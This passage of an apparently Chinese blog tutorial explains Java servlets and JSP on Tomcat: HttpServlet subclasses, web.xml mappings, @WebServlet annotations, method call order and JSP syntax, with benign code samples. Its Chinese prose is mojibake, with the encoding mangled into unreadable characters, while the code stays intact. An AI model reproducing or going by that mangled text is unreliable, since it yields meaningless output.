<li><code>doHEAD</code></li>
<li><code>doPUT</code></li>
<li><code>doDELETE</code></li>
<li><code>doOPTIONS</code></li>
<li><code>doTRACE</code></li>
</ul>
<p>é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡ç»§æ‰¿ <code>HttpServlet</code> ç±»æ¥è‡ªå®šä¹‰ <code>servlet</code> çš„å¤„ç†è¿‡ç¨‹äº†ã€‚</p>
<h4 id="ç¤ºä¾‹">- ç¤ºä¾‹ -</h4>
<p>æ¯”å¦‚è¯´å†™ä¸€ä¸ªå¯¹ <code>GET</code> è¯·æ±‚æ–¹æ³•ç®€å•çš„å¤„ç†è¿‡ç¨‹ï¼Œå…¶ä¸­ <code>Main</code> ç±»é€šè¿‡ç»§æ‰¿ <code>HttpServlet</code> ç±»( <code>HttpServlet</code> =&gt; <code>GenericServlet</code> =&gt; <code>Servlet</code>)å®ç°äº† <code>Servlet</code> æ¥å£ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.jspstudy3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;== Main() ==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;== init() ==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;== doGet() ==&quot;</span>);</span><br><span class="line">        resp.getWriter().println(<span class="string">&quot;doGet&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä»¥ä¸Šä»£ç ç”¨ <code>Main</code> ç±»è¿˜é‡å†™äº† <code>HttpServlet</code> ç±»çš„ <code>init</code> æ–¹æ³•ï¼Œå¹¶æ‰‹åŠ¨æ·»åŠ äº†æ„é€ æ–¹æ³•ï¼Œç›®çš„æ˜¯å¯¹æ¯”è¿™å‡ ç§æ–¹æ³•çš„è°ƒç”¨é¡ºåºå’Œé€»è¾‘ã€‚</p>
<p>ç„¶åæ˜¯ <code>web.xml</code> ğŸ‘‡</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>main<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.jspstudy3.Main<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>main<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/main<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä»¥ä¸Šå†…å®¹å…ˆæ˜¯ç”¨ <code>&lt;servlet&gt;</code> æ ‡ç­¾å£°æ˜ä¸€ä¸ªåä¸º <code>main</code> çš„ <code>servlet</code> ï¼Œå…¶å¯¹åº”çš„ç±»ä¸º <code>com.example.jspstudy3.Main</code> ï¼Œè¿›è€Œç”¨ <code>&lt;servlet-mapping&gt;</code> æ ‡ç­¾æ¥å‘Šè¯‰ <code>tomcat</code> å½“ä»¥å“ªç§æ ¼å¼ <code>url</code>è®¿é—®æ—¶ä¼šäº¤ç»™åä¸º <code>main</code> çš„ <code>servlet</code> å¤„ç†ã€‚</p>
<p>å…¶ä¸­ä¸€ä¸ª <code>servlet</code> å¯ç”±å¤šä¸ª <code>&lt;servlet-mapping&gt;</code> æ ‡ç­¾å¯¹åº”ï¼Œè€Œ <code>&lt;servlet-mapping&gt;</code> æ ‡ç­¾ä¸­çš„ <code>&lt;url-pattern&gt;</code> å†…å®¹ä¸ºæ­£åˆ™è¡¨è¾¾å¼ï¼Œä½†ä»…å¯ä»¥ç”¨å½¢å¦‚ä»¥ä¸‹çš„é€šé…ç¬¦æ¥è¡¨ç¤ºğŸ‘‡</p>
<ul>
<li><code>*.[åç¼€å]</code></li>
<li><code>/å¼€å¤´ï¼Œ*ç»“å°¾</code></li>
</ul>
<p>åŒæ—¶ä¼šæ ¹æ®è¡¨è¾¾å¼çš„æ¨¡ç³Šåº¦æ¥å†³å®šåŒ¹é…çš„ä¼˜å…ˆçº§ï¼Œè¶Šå‡†ç¡®çš„è¡¨è¾¾å¼ä¼˜å…ˆçº§è¶Šé«˜ï¼Œè¶Šæ¨¡ç³Šçš„é€šé…ç¬¦ä¼˜å…ˆçº§è¶Šä½ã€‚</p>
<p>ä½†å¦‚æœæ¯ä¸ª <code>serlvet</code> éƒ½åœ¨ <code>web.xml</code> å°±ä¼šæ˜¾å¾—ç‰¹åˆ«è‡ƒè‚¿ï¼Œåœ¨ <code>servlet3.0+</code> æ—¶å¯ä»¥ç”¨ä»¥ä¸‹æ–¹å¼æ›¿ä»£ <code>serlvet</code> åœ¨ <code>web.xml</code> çš„é…ç½®ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(name = &quot;Main&quot;, urlPatterns = &quot;/main&quot;)</span></span><br></pre></td></tr></table></figure>
<p>å¦‚æœæ˜¯å¤šä¸ªè¡¨è¾¾å¼ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(name = &quot;Main&quot;, urlPatterns = &#123;&quot;/main&quot;,&quot;/Main&quot;&#125;)</span></span><br></pre></td></tr></table></figure>
<p>æ­¤æ—¶æ— è®ºè®¿é—® <code>/main</code> æˆ–æ˜¯ <code>Main</code> éƒ½å¯ä»¥è¾¾åˆ°è®¿é—®åä¸º <code>main</code> çš„ <code>servlet</code> ç›®çš„ã€‚</p>
<p>å¦å¤–ï¼Œå¦‚æœè·Ÿè¿› <code>@WebServlet</code> å¯ä»¥å‘ç°å®é™…ä¸Š <code>urlPatterns</code> å’Œ <code>value</code> æ˜¯åŒä¸€ä¸ªåŠŸèƒ½ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202230842249.png" alt="image-20220223084224126"></p>
<p>æ‰€ä»¥ä¸Šè¿°è¡¨è¾¾å¼å¯ä»¥å†™æˆğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(name = &quot;Main&quot;, value = &#123;&quot;/main&quot;,&quot;/Main&quot;&#125;)</span></span><br></pre></td></tr></table></figure>
<p>ä½† <code>value</code> å’Œ <code>urlPatterns</code> ä¸èƒ½åŒæ—¶å­˜åœ¨ã€‚</p>
<p>æ¯”æ–¹è¯´è¿™é‡Œå†™å…¥ <code>@WebServlet(name = &quot;Main&quot;, value = &#123;&quot;/main&quot;&#125;)</code> ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.jspstudy3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;Main&quot;, value = &#123;&quot;/main&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;== Main() ==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;== init() ==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;== doGet() ==&quot;</span>);</span><br><span class="line">        resp.getWriter().println(<span class="string">&quot;doGet&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å½“è®¿é—® <code>http://localhost:9058/jspstudy3_war_exploded/main</code> å¹¶åˆ·æ–°ä¸¤æ¬¡å¾—åˆ°çš„ç»“æœğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202230934536.png" alt="image-20220223093437449"></p>
<p>å¯è§åœ¨ <code>Main</code> è¿™ä¸ª <code>servlet</code> ä¸­æ–¹æ³•çš„è°ƒç”¨é¡ºåºä¸º <code>æ„é€ æ–¹æ³•</code> =&gt; <code>init()</code> =&gt; <code>doGet()</code> ï¼Œæ˜¾ç„¶ <code>init</code> æ–¹æ³•æ˜¯åœ¨ <code>servlet</code> è¢«å®ä¾‹åŒ–å®Œæ¯•åæ‰ç”± <code>servlet</code> å®¹å™¨è°ƒç”¨ã€‚</p>
<h4 id="servletå’Œtomcatè¿‡ç¨‹">- servletå’Œtomcatè¿‡ç¨‹ -</h4>
<p>â‘  <code>å®¢æˆ·ç«¯</code> å‘ <code>tomcat</code> æœåŠ¡å™¨(<code>servlet</code> å®¹å™¨)çš„ <code>serlvet</code> (é€šè¿‡ <code>&lt;serlvet-mapping&gt;</code> å°†è¯·æ±‚URLå¯¹åº”åˆ°ç›¸åº” <code>serlvet</code>ç±»)å‘é€ <code>http</code> è¯·æ±‚</p>
<p>â‘¡ <code>servlet</code> å®¹å™¨å°†ä» <code>å®¢æˆ·ç«¯</code> å‘æ¥çš„ <code>http</code> è¯·æ±‚å°è£…æˆ <code>ServletRequest</code> å¯¹è±¡</p>
<p>â‘¢  <code>servlet</code> å®¹å™¨å®ä¾‹åŒ–ä¸€ä¸ª <code>ServletResponse</code> å¯¹è±¡ç”¨ä½œå“åº”</p>
<p>â‘£ <code>servlet</code> å®¹å™¨å®ä¾‹åŒ–ç›¸åº” <code>servlet</code> ç±»(å¦‚æœè¯¥ <code>servlet</code> æœªåœ¨æœåŠ¡å™¨å¯åŠ¨æ—¶è¢«å®ä¾‹åŒ–)ï¼Œç„¶åå°† <code>ServletRequest</code> ä»¥åŠ <code>ServletResponse</code> å¯¹è±¡ä½œä¸ºå‚æ•°ä¼ ç»™ <code>servlet</code> ç±»å®ä¾‹å¯¹è±¡</p>
<p>â‘¤ <code>servlet</code> å®¹å™¨å°† <code>servlet</code> ç±»å®ä¾‹å¯¹è±¡å¯¹ç›¸åº”å†…å®¹çš„å¤„ç†ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯</p>
<h3 id="jsp">- jsp -</h3>
<p><code>jsp</code> å…¨ç§°ä¸º <code>java server pages</code> ï¼Œæ—¨åœ¨ä½¿ç”¨ <code>jsp</code> æ ‡ç­¾åœ¨é™æ€çš„ <code>html</code> é¡µé¢ä¸­æ’å…¥ <code>java</code> ä»£ç (é€šå¸¸ä¸º <code>&lt;% [javaä»£ç ] %&gt;</code> æ ¼å¼)ï¼Œä»¥ä¾¿å®ç°åœ¨é™æ€æ¨¡æ¿é¡µé¢ä¸­åŠ¨æ€ç”Ÿæˆéƒ¨åˆ†å†…å®¹ã€‚</p>
<h4 id="jspå’Œserlvetè”ç³»">- jspå’Œserlvetè”ç³» -</h4>
<p>ç®€å•æ¥è¯´ï¼Œ<code>jsp</code> å®é™…ä¸Šæ˜¯ä¸€ç§ <code>servlet</code> ï¼Œåªæ˜¯è¡¨å‹å½¢å¼ä¸åŒã€‚å½“å®¢æˆ·ç«¯è®¿é—® <code>jsp</code> æ—¶ï¼ŒæœåŠ¡å™¨ä¼šå°†å¯¹åº”çš„ <code>jsp</code> ç¼–è¯‘æˆ <code>class</code> æ–‡ä»¶å¹¶å°†ç»“æœè¾“å‡ºåˆ°æµè§ˆå™¨ã€‚</p>
<p>æ¯”å¦‚å†™ä»¥ä¸‹ <code>jsp</code> æ–‡ä»¶ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231002302.png" alt="image-20220223100203201"></p>
<p>ç”±äºè¿™é‡Œæˆ‘çš„ <code>CATALINA_BASE</code> å€¼ä¸º <code>C:\Users\22929\AppData\Local\JetBrains\IntelliJIdea2021.3\tomcat\f798d3f2-b185-4339-9a97-cdc26ef39996</code> æ•…åœ¨ä¿æŒæœåŠ¡å™¨è¿è¡Œçš„æƒ…å†µä¸‹å¯ä»¥åœ¨ <code>C:\Users\22929\AppData\Local\JetBrains\IntelliJIdea2021.3\tomcat\f798d3f2-b185-4339-9a97-cdc26ef39996\work\Catalina\localhost\jspstudy3_war_exploded\org\apache\jsp</code> ç›®å½•ä¸­æ‹¿åˆ°æœ‰å…³ <code>jsp</code> çš„ <code>class</code> å’Œ <code>java</code>æ–‡ä»¶ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231005152.png" alt="image-20220223100524064"></p>
<p>å¦‚æœæ‰“å¼€ <code>test_jsp.java</code> æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ° <code>test_jsp</code> ç±»ç»§æ‰¿äº† <code>org.apache.jasper.runtime.HttpJspBase</code> ç±»ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231023539.png" alt="image-20220223102358463"></p>
<p>ä½¿ç”¨ <code>jd-gui</code> æ‰“å¼€ <code>tomcat</code> ç›®å½•ä¸‹çš„ <code>lib\jasper.jar</code> æ–‡ä»¶å¯ä»¥å¾—åˆ° <code>org.apache.jasper.runtime.HttpJspBase</code> ç±»çš„ä»£ç ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231028081.png" alt="image-20220223102823939"></p>
<p>å¯è§æ˜¯ç»§æ‰¿äº† <code>HttpServlet</code> ç±»ï¼Œè€Œ <code>HttpServlet</code> ç±»æœ€ç»ˆé€šè¿‡ç»§æ‰¿ <code>GenericServlet</code> ç±»å®ç° <code>serlvet</code> æ–¹æ³•ï¼Œå› æ­¤å¯ä»¥è¯´ <code>jsp</code> å®é™…ä¸Šæ˜¯ä¸€ä¸ª <code>serlvet</code> ã€‚</p>
<p>å¦‚æœç»§ç»­çœ‹è¿™ä¸ª <code>HttpJspBase</code> ç±»è¿˜å¯ä»¥å‘ç°ï¼Œå…¶ <code>init</code> ï¼Œ<code>service</code> ï¼Œä»¥åŠ <code>destroy</code> æ–¹æ³•åˆ†åˆ«å­˜åœ¨ <code>_jspInit</code> ï¼Œ<code>_jspservice</code> å’Œ <code>_jspDestory</code> æ–¹æ³•çš„è°ƒç”¨ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231033959.png" alt="image-20220223103358754"></p>
<p>å›æ¥çœ‹ <code>test_jsp.java</code> æ–‡ä»¶ï¼Œå­˜åœ¨ä¸Šè¿°çš„æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231034745.png" alt="image-20220223103441670"></p>
<p>å…¶ä¸­åœ¨ <code>_jspService</code> æ–¹æ³•ä¸­å¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°å¯¹ç›¸åº”å†…å®¹çš„ç›¸å…³å†™å…¥ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231037493.png" alt="image-20220223103715324"></p>
<p>å› æ­¤å¯çŸ¥åœ¨ <code>jsp</code> å†™çš„ä»»ä½• <code>html</code> å†…å®¹éƒ½ä¼šè¢«å…ˆè½¬æ¢ä¸º <code>servlet</code> ï¼Œç„¶åç”¨ <code>out.write</code> æ¥å†™å…¥å“åº”å†…å®¹ï¼Œè€Œ <code>java</code> ä»£ç åˆ™ä¼šåœ¨è¿™ä¸ª <code>test_jsp</code> ç±»çš„ <code>_jspService</code> æ–¹æ³•ä¸­æ‰§è¡Œã€‚</p>
<p>åŒæ—¶ <code>jsp</code> ä¹Ÿå¯ä»¥çœ‹ä½œæ˜¯ä¸€ä¸ªç±»çš„å†…éƒ¨ï¼Œåƒæ˜¯ <code>test_jsp</code> ç±»çš„å±æ€§æˆ–æ˜¯æ–¹æ³•éƒ½å¯ä»¥åœ¨è¿™ä¸ª <code>jsp</code> é‡Œé¢ç›´æ¥ä½¿ç”¨çš„ã€‚</p>
<h4 id="jspå’ŒservletåŒºåˆ«">- jspå’ŒservletåŒºåˆ« -</h4>
<p>ç”±äº <code>jsp</code> æœ€ç»ˆçš„å½’å®¿æ˜¯è½¬æ¢æˆ <code>servlet</code> ï¼ŒåŒºåˆ«ä¹Ÿå°±åªèƒ½ä»å…¶ä»–æ–¹é¢æ¥åŒºåˆ†ï¼Œæ¯”å¦‚åœ¨å¤šå±‚åº”ç”¨ä¸­ <code>jsp</code> ä¸€èˆ¬æ˜¯ç”¨æ¥åšè¡¨ç°å±‚ï¼Œè€Œ<code>servlet</code> ç”¨ä½œæ§åˆ¶å±‚ï¼›<code>jsp</code> æ˜¯å…ˆéƒ¨ç½²åå†ç¼–è¯‘ï¼Œ<code>servlet</code> ä¸€èˆ¬æ˜¯å…ˆç¼–è¯‘åéƒ¨ç½²ï¼Œè¿™æ · å¦‚æœ <code>jsp</code> ä»£ç å‘ç”Ÿäº†æ”¹åŠ¨ï¼Œ<code>tomcat</code> å°±ä¼šåœ¨ä¸‹æ¬¡å®¢æˆ·ç«¯è¯·æ±‚æ—¶é‡æ–°ç¼–è¯‘ç”Ÿæˆ <code>class</code> æ–‡ä»¶ï¼Œå°±ä¸éœ€è¦é‡å¯ <code>tomcat</code> æœåŠ¡å™¨ã€‚</p>
<h4 id="jspå’Œtomcatè¿‡ç¨‹">- jspå’Œtomcatè¿‡ç¨‹ -</h4>
<p>â‘  <code>å®¢æˆ·ç«¯</code> å‘ <code>tomcat</code> æœåŠ¡å™¨ä¸Šçš„ <code>jsp</code> å‘é€ <code>http</code> è¯·æ±‚</p>
<p>â‘¡ <code>tomcat</code> å®¹å™¨å°†ä» <code>å®¢æˆ·ç«¯</code> å‘æ¥çš„ <code>http</code> è¯·æ±‚å°è£…æˆ <code>ServletRequest</code> å¯¹è±¡</p>
<p>â‘¢  <code>tomcat</code> å®¹å™¨å®ä¾‹åŒ–ä¸€ä¸ª <code>ServletResponse</code> å¯¹è±¡ç”¨ä½œå“åº”</p>
<p>â‘£  <code>tomcat</code> æœåŠ¡å™¨å°†å¯¹åº”çš„ <code>jsp</code> æ–‡ä»¶è½¬æ¢æˆç›¸åº” <code>java</code> æ ¼å¼çš„ <code>servlet</code> æ–‡ä»¶</p>
<p>â‘¤ <code>tomcat</code> æœåŠ¡å™¨å°†ç›¸åº” <code>java</code> æ ¼å¼çš„ <code>servlet</code> æ–‡ä»¶ç¼–è¯‘æˆå¯¹åº” <code>class</code> æ ¼å¼çš„ <code>servlet</code> æ–‡ä»¶(æ­¤æ—¶å°±æ¥ç€æœ‰å…³ <code>servlet</code> çš„å¤„ç†éƒ¨åˆ†äº†)</p>
<p>â‘¥ <code>tomcat</code> æœåŠ¡å™¨å®ä¾‹åŒ–å¯¹åº”çš„ <code>servlet</code> ç±»(å¦‚æœè¯¥ <code>servlet</code> ç±»æœªè¢«å®ä¾‹åŒ–)ï¼Œå°† <code>ServletRequest</code> ä»¥åŠ <code>ServletResponse</code> å¯¹è±¡ä½œä¸ºå‚æ•°ä¼ ç»™ <code>servlet</code> ç±»å®ä¾‹å¯¹è±¡</p>
<p>â‘¦ <code>tomcat</code> æœåŠ¡å™¨å°† <code>servlet</code> ç±»å®ä¾‹å¯¹è±¡å¯¹ç›¸åº”å†…å®¹çš„å¤„ç†ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯</p>
<h4 id="è¯­æ³•">- è¯­æ³• -</h4>
<p><code>JSPè„šæœ¬</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% [javaä»£ç æ®µ] %&gt;</span><br></pre></td></tr></table></figure>
<p>ç­‰ä»· <code>XML</code> è¯­å¥ğŸ‘‡</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp:scriptlet</span>&gt;</span>   </span><br><span class="line">  [javaä»£ç æ®µ]</span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp:scriptlet</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥åœ¨ <code>JSPè„šæœ¬</code> ä¸­å†™å…¥ä»»æ„ <code>java</code> ä»£ç ã€‚</p>
<p><code>JSPå£°æ˜</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! [javaå£°æ˜å†…å®¹] %&gt;</span><br></pre></td></tr></table></figure>
<p>ç­‰ä»· <code>XML</code> è¯­å¥ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:declaration&gt;   </span><br><span class="line">  [javaå£°æ˜å†…å®¹]</span><br><span class="line">&lt;/jsp:declaration&gt;</span><br></pre></td></tr></table></figure>
<p>å£°æ˜å†…å®¹å¯ä»¥æ˜¯å¯¹ä¸€ä¸ªæˆ–å¤šä¸ªå˜é‡ï¼Œæ–¹æ³•å®šä¹‰æˆ–é‡å†™çš„è¯­å¥ã€‚è¿™äº›å£°æ˜çš„å†…å®¹åœ¨ç»è¿‡è§£æåä¼šæ”¾åˆ°åé¢è½¬æ¢çš„ <code>java</code> æ–‡ä»¶ä¸­ï¼Œæ¯”å¦‚åœ¨ <code>test.jsp</code> ä¸­æœ‰ä»¥ä¸‹å£°æ˜è¯­å¥ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">100</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;init&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p>é‚£ä¹ˆå…¶å¯¹åº”çš„ <code>test_jsp.java</code> æ–‡ä»¶çš„ <code>test_jsp</code> ç±»çš„å¼€å¤´å°±ä¼šå¤šå‡ºä»¥ä¸Šå†…å®¹ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231212701.png" alt="image-20220223121212647"></p>
<p>å¯ä»¥çœ‹ä½œæ˜¯ç›´æ¥å†™å…¥å¯¹åº”çš„ç±»ã€‚</p>
<p><code>JSPè¡¨è¾¾å¼</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= [è¡¨è¾¾å¼] %&gt;</span><br></pre></td></tr></table></figure>
<p>ç­‰ä»· <code>XML</code> è¯­å¥ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:expression&gt;   </span><br><span class="line">  [è¡¨è¾¾å¼]</span><br><span class="line">&lt;/jsp:expression&gt;</span><br></pre></td></tr></table></figure>
<p>å®é™…ä¸Š <code>JSPè¡¨è¾¾å¼</code> ç­‰ä»·äº <code>out.write([è¡¨è¾¾å¼])</code> ã€‚å¦å¤–ï¼Œæ— æ³•ç”¨ <code>;</code> ç»“å°¾ã€‚</p>
<p><code>JSPæ³¨é‡Š</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%-- [æ³¨é‡Šå†…å®¹] --%&gt;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ª <code>JSPæ³¨é‡Š</code> å¯ä»¥æ³¨é‡Šä»»ä½•é‡Œé¢çš„ä¸œè¥¿ï¼Œä¾‹å¦‚åœ¨è°ƒè¯•çš„æ—¶å€™å¯ä»¥ç›´æ¥ç”¨ <code>&lt;%-- [æ³¨é‡Šå†…å®¹] --%&gt;</code> æ ¼å¼å»è®©æŸæ®µ <code>html</code> å†…å®¹æ¶ˆå¤±ã€‚</p>
<h4 id="æŒ‡ä»¤-directive">- æŒ‡ä»¤(directive) -</h4>
<p><code>jsp</code> çš„æŒ‡ä»¤ç”¨æ¥è®¾ç½®æ•´ä¸ªé¡µé¢ç›¸å…³çš„å±æ€§ï¼ŒæŒ‡ä»¤çš„è¯­æ³•æ ¼å¼ğŸ‘‡</p>
